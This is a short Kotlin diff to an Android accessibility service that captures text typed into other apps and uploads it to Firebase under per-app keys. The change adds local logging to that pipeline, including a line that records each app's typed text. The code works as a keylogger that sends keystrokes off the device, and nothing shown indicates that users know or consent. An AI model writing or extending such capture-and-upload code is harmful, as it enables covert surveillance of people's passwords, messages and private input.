@@ -38,8 +38,10 @@ class AppAccessibilityService : AccessibilityService() {
             }
             serviceInfo = info
             Log.d(TAG, "Accessibility Service Connected Successfully")
+            LogStore.addLog("Accessibility Service Connected")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
+            LogStore.addLog("Accessibility Service connection error: ${e.toString()}")
         }
     }
 
@@ -69,12 +71,15 @@ class AppAccessibilityService : AccessibilityService() {
                     ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Accessibility text synced to Firebase successfully")
+                            LogStore.addLog("Accessibility synced ($sanitizedAppName): $typedText")
                         }
                         .addOnFailureListener { e: Exception ->
                             Log.e(TAG, "FAILED to sync accessibility text to Firebase", e)
+                            LogStore.addLog("Accessibility sync FAILED: ${e.toString()}")
                         }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in coroutine accessibility event", e)
+                    LogStore.addLog("Accessibility exception: ${e.toString()}")
                 }
             }
         } catch (e: Exception) {
